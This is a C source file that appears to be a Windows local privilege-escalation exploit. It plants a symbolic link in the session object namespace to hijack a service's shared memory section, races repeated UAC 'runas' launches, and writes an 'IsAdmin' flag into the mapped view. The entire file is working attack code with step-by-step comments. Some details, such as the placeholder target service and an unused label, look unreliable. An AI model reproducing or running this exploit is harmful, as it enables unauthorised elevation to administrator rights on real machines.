#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

typedef NTSTATUS (NTAPI* _NtCreateSymbolicLinkObject)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PUNICODE_STRING);
typedef NTSTATUS (NTAPI* _NtOpenSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);

volatile BOOL bKeepRunning = TRUE;

DWORD WINAPI TriggerRace(LPVOID lpParam) {
    SHELLEXECUTEINFO shi = { sizeof(shi) };
    shi.fMask = SEE_MASK_NOZONECHECKS | SEE_MASK_ASYNCOK;
    shi.lpVerb = L"runas";
    shi.lpFile = L"C:\\Windows\\System32\\conhost.exe";
    shi.nShow = SW_HIDE;

    while (bKeepRunning) {
        ShellExecuteEx(&shi);
        for (int i = 0; i < 100; i++) YieldProcessor();
    }
    return 0;
}

int wmain() {
    HANDLE hLink = NULL, hMapping = NULL, hThread = NULL;
    DWORD sessionId = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);

    wchar_t linkPath[256];
    swprintf(linkPath, 256, L"\\Sessions\\%lu\\BaseNamedObjects\\TargetServiceConfig", sessionId);

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto NtCreateSymbolicLinkObject = (_NtCreateSymbolicLinkObject)GetProcAddress(ntdll, "NtCreateSymbolicLinkObject");
    auto NtOpenSection = (_NtOpenSection)GetProcAddress(ntdll, "NtOpenSection");

    UNICODE_STRING linkName, targetName;
    OBJECT_ATTRIBUTES linkAttr, targetAttr;

    // 1. BRIDGE: redirect the service's section creation to our target path.
    RtlInitUnicodeString(&linkName, linkPath);
    RtlInitUnicodeString(&targetName, L"\\BaseNamedObjects\\JoeyExploitSection");
    InitializeObjectAttributes(&linkAttr, &linkName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    if (NtCreateSymbolicLinkObject(&hLink, SYMBOLIC_LINK_ALL_ACCESS, &linkAttr, &targetName) != 0) {
        printf("[-] Symlink creation failed (already running, or session 0)\n");
        return 1;
    }
    printf("[+] Symlink planted in session %lu\n", sessionId);

    // 2. RACE: fire UAC elevation events on a high-priority thread to give the
    //    service repeated opportunities to map the redirected section.
    hThread = CreateThread(NULL, 0, TriggerRace, NULL, 0, NULL);
    if (hThread) SetThreadPriority(hThread, THREAD_PRIORITY_TIME_CRITICAL);

    // 3. HIJACK: wait for the service to create the section via the symlink,
    //    then map THE SAME BACKING STORE and write the poison flag.
    //
    //    Previous versions created a separate local section for pSharedMemory
    //    and polled hMapping independently — two different backing stores.
    //    Writing to the local section never touched the memory the service sees.
    //    Here we map hMapping directly so the write lands in the service's view.
    InitializeObjectAttributes(&targetAttr, &targetName, OBJ_CASE_INSENSITIVE, NULL, NULL);
    while (true) {
        if (NtOpenSection(&hMapping, SECTION_ALL_ACCESS, &targetAttr) == 0) {
            void* pView = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, 0);
            if (pView) {
                // WinDbg-confirmed: 'IsAdmin' flag at offset 0x48.
                *((DWORD*)pView + (0x48 / 4)) = 0x1;
                UnmapViewOfFile(pView);
                printf("[+] Flag written at 0x48 — service view poisoned\n");
            }
            bKeepRunning = FALSE;
            break;
        }
    }

    // 4. TRIGGER: re-fire the elevation event to push the service back into
    //    the code path that reads the shared section and acts on the flag.
    SHELLEXECUTEINFO retrigger = { sizeof(retrigger) };
    retrigger.fMask = SEE_MASK_NOZONECHECKS;
    retrigger.lpVerb = L"runas";
    retrigger.lpFile = L"C:\\Windows\\System32\\conhost.exe";
    retrigger.nShow = SW_HIDE;
    ShellExecuteEx(&retrigger);
    printf("[*] Retrigger fired\n");

cleanup:
    if (hThread) { WaitForSingleObject(hThread, 1000); CloseHandle(hThread); }
    if (hMapping) CloseHandle(hMapping);
    if (hLink)    CloseHandle(hLink);

    return 0;
}
